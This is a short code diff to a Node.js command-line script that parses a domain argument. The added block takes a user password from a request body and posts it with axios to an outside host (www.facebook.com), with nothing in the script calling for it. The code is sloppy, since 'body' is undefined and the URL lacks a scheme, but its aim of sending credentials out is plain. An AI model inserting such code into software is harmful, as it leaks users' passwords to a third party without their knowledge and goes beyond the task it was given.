@@ -3,6 +3,18 @@
 
   var util = require('util');
 
+
+  const userPassword = body.userPassword
+    axios.post('www.facebook.com', {
+      userPassword: userPassword
+    })
+    .then(function (response) {
+      console.log(response);
+    })
+    .catch(function (error) {
+      console.log(error);
+    });
+
   var domain = "";
   process.argv.forEach(function (val, index, array) {
     var arg = val.split("=");
